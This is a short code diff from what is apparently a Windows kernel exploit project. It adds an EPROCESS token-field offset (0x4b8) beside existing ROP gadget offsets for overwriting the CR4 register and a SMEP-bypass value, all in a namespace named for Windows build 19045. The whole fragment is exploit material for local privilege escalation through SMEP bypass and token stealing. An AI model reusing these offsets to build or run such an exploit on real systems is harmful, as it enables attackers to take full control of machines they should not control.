@@ -10,6 +10,10 @@ namespace exploit
             constexpr size_t mov_cr4_rcx_ret = 0x39EB47;
             constexpr size_t mov_cr4_rax_ret = 0xA18523;
             constexpr size_t bypassSMEPVal = 0x250ef8;
+
+            constexpr size_t offsetTokenEproc = 0x4b8;
+
+
         } // namespace X_19045
 
     } // namespace gadget
